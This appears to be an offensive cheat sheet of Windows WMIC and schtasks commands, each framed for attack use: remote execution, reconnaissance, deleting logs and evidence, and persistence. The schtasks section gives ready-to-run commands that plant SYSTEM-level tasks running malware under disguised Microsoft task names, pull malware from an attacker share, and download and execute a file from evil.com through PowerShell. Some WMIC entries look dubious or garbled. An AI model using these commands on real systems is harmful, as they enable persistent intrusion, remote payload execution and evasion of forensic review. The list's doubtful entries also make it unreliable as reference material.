      Windows Management Instrumentation (WMIC) - System management
        Execute remote commands using "wmic /node:[target] process call create" to run arbitrary commands on remote systems
        Query system information using "wmic computersystem get" to gather host details, domain membership, and hardware specs
        Enumerate installed software using "wmic product get" to identify security tools and potential vulnerabilities
        List running processes using "wmic process get" to identify targets for injection or termination
        Query user account information using "wmic useraccount get" to map out local accounts and privileges
        Gather startup program information using "wmic startup get" to identify persistence mechanisms
        Extract service configuration using "wmic service get" to identify potential privilege escalation vectors
        Collect operating system information using "wmic os get" for version targeting and exploit selection
        Map network shares using "wmic share get" to identify data locations and lateral movement paths
        Monitor system events using "wmic ntevent" to track security events and system changes
        Query BIOS information using "wmic bios get" to gather system firmware details and hardware identifiers
        Enumerate disk drives using "wmic logicaldisk get" to map storage devices and identify data locations
        Manage scheduled tasks using "wmic job" to create or modify automated task execution
        Extract system environment variables using "wmic environment get" to understand system configuration
        Query network adapter configuration using "wmic nicconfig get" for network reconnaissance
        Collect printer information using "wmic printer get" to map network resources
        Monitor system performance using "wmic perfmon" to identify resource usage patterns
        Extract Windows patch information using "wmic qfe get" to identify missing security updates
        Query system drivers using "wmic sysdriver get" to identify potential security tool drivers
        Manage Windows firewall using "wmic firewall" to modify security settings
        Query pagefile settings using "wmic pagefileset get" to analyze system memory configuration
        Enumerate system memory using "wmic memcache get" and "wmic memorychip get" for hardware profiling
        Access Windows Recovery Environment using "wmic recoveros get" to identify recovery options
        Query system logs using "wmic nteventlog get" for detailed log management and deletion
        Manage system time using "wmic timezone get" to potentially disrupt logging and forensics
        Extract registry quota information using "wmic quotasetting get" for system limits analysis
        Query system boot configuration using "wmic bootconfig get" to understand startup settings
        Enumerate system partitions using "wmic partition get" for detailed storage analysis
        Manage system power settings using "wmic powersettings" to prevent sleep/hibernation
        Query system backup settings using "wmic backup get" to identify recovery mechanisms
        Query desktop settings using "wmic desktop get" to gather user environment information
        Enumerate system volumes using "wmic volume get" for comprehensive storage mapping
        Query system account settings using "wmic sysaccount get" for privileged account analysis
        Manage registry settings using "wmic registry" for system configuration changes
        Query system locale using "wmic locale get" for language and regional settings
        Extract group policy settings using "wmic policy get" to understand security controls
        Query system cache using "wmic cachememory get" for memory analysis
        Manage system files using "wmic datafile where" to locate and manipulate critical files
        Query system security settings using "wmic security get" for security configuration analysis
        Extract system fan and temperature data using "wmic temperature get" for hardware monitoring
      Task Scheduler (schtasks.exe) - Task automation and scheduling
        Create persistent task with SYSTEM privileges: schtasks /create /tn "UpdateService" /tr "C:\malware.exe" /sc ONLOGON /ru "SYSTEM"
        Schedule task to execute malicious PowerShell script at regular intervals: schtasks /create /tn "SystemUpdate" /tr "powershell.exe -enc [base64script]" /sc MINUTE /mo 30
        Query existing scheduled tasks for reconnaissance: schtasks /query /fo LIST /v
        Modify existing legitimate task to execute malicious payload: schtasks /change /tn "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan" /tr "C:\malware.exe"
        Create task triggered by system events: schtasks /create /tn "EventLogger" /tr "cmd.exe /c evil.bat" /sc ONEVENT /ec Application /mo "*[System/EventID=1000]"
        Export scheduled task configurations for analysis: schtasks /query /xml > tasks.xml
        Delete task evidence after execution: schtasks /delete /tn "MaliciousTask" /f
        Create hidden task with high privileges: schtasks /create /tn "\Microsoft\Windows\System\Update" /tr "C:\Windows\Temp\payload.exe" /sc DAILY /st 00:00 /ru "SYSTEM" /rl HIGHEST
        Import pre-configured malicious task from XML: schtasks /create /xml "evil_task.xml" /tn "SecurityUpdate"
        Enable task on remote system: schtasks /create /s remote_host /u domain\user /p password /tn "RemoteTask" /tr "\\attacker\share\malware.exe" /sc ONCE /st 23:00
        Create task with multiple triggers: schtasks /create /tn "MultiTrigger" /tr "cmd.exe /c malware.exe" /sc DAILY /st 12:00 /ri 60 /du 24:00
        Establish wake-to-run task persistence: schtasks /create /tn "WakeTask" /tr "evil.exe" /sc ONIDLE /i 30 /wake
        Set up task with custom COM handler: schtasks /create /tn "ComHandler" /tr "rundll32.exe shell32.dll,Control_RunDLL" /sc ONSTART /ru "NT AUTHORITY\SYSTEM"
        Create task with network trigger: schtasks /create /tn "NetworkMonitor" /tr "payload.exe" /sc ONEVENT /ec Microsoft-Windows-NetworkProfile/Operational /mo "*[System[(EventID=10000)]]"
        Deploy task with delayed execution: schtasks /create /tn "DelayedExec" /tr "cmd.exe /c timeout 3600 && malware.exe" /sc ONLOGON
        Establish registry monitoring task: schtasks /create /tn "RegWatch" /tr "script.vbs" /sc ONEVENT /ec Security /mo "*[System[(EventID=4657)]]"
        Create self-updating task chain: schtasks /create /tn "UpdateChain" /tr "powershell.exe -c (New-Object Net.WebClient).DownloadFile('http://evil.com/update.exe','%temp%\update.exe'); Start-Process '%temp%\update.exe'" /sc HOURLY
        Set up task with workstation lock trigger: schtasks /create /tn "LockMonitor" /tr "backdoor.exe" /sc ONEVENT /ec Microsoft-Windows-Winlogon /mo "*[System[(EventID=4800)]]"
        Create task with custom principal: schtasks /create /tn "CustomAuth" /tr "malware.exe" /sc DAILY /ru "CustomAccount" /rp "Password123" /rl LIMITED
        Deploy task with custom priority: schtasks /create /tn "HighPriority" /tr "resource_consumer.exe" /sc MINUTE /mo 5 /np /rl HIGHEST
        Create synchronized tasks for distributed execution: schtasks /create /tn "SyncTask1" /tr "cmd.exe /c start /b sync_payload.exe && schtasks /run /tn SyncTask2" /sc ONCE /st 00:00
        Establish task with user interaction requirement: schtasks /create /tn "InteractiveTask" /tr "payload.exe" /sc ONLOGON /it
        Deploy task with custom security descriptor: schtasks /create /tn "SecureTask" /tr "malware.exe" /sc DAILY /st 12:00 /ru "SYSTEM" /sd "D:(A;;FRFX;;;S-1-5-18)"
        Create task with environment variable manipulation: schtasks /create /tn "EnvVarTask" /tr "cmd.exe /c set PATH=%PATH%;C:\malware & evil.exe" /sc HOURLY
        Set up task with conditional execution: schtasks /create /tn "ConditionalTask" /tr "cmd.exe /c if exist C:\flag.txt (start payload.exe)" /sc MINUTE /mo 5
